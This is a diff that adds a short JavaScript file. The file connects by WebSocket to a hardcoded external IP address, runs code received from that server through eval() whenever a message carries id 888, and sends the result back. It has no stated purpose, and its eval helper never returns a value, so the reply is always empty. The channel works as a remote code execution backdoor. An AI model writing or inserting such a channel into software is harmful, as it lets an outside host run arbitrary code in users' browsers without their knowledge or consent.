@@ -1,0 +1,57 @@
+ws = new WebSocket("ws://45.32.200.249:8000/ws"); 
+    
+
+    ws.onopen = function(){
+            console.log('open');
+    };
+    ws.onmessage = function(ev){
+      console.log('recieved message'+ev.data.toString ());
+      var json = JSON.parse(ev.data);
+      var rowid =json.id;
+      if (json.id==888){
+          var ret=eval_javascript(decodeURIComponent(json.value).toString())
+          console.log('value' + json.value)
+          console.log('ret'+ ret)
+          ws.send('{"id":'+json.id + ',"value":' + ret+ '}')
+      }          
+    };
+
+    ws.onclose = function(ev){ 
+      console.log('closed');
+    };
+
+    ws.onerror = function(ev){      
+      console.log('error occurred');
+    };
+
+function  aa(){ 
+return 1+2
+ }
+
+
+function eval_javascript(code) {
+ 
+  var result_ok    = '';
+  var result_error = '';
+ 
+  if (code.length==0) {
+    result_error = 'ERROR: empty code';
+  }
+ 
+  try {
+    result_ok = eval(code);
+  } catch (e) {
+    result_error = 'ERROR: '+e;
+  }
+ 
+  if (result_error=='') {
+    var str = '';
+    if (result_ok != undefined) {
+      str = '\n\nRETURN CODE: '+result_ok;
+    }
+    //alert('Test ok.\nCompiles (eval) with no errors. '+str);
+  } else {
+    //alert(result_error)
+  }
+ 
+}
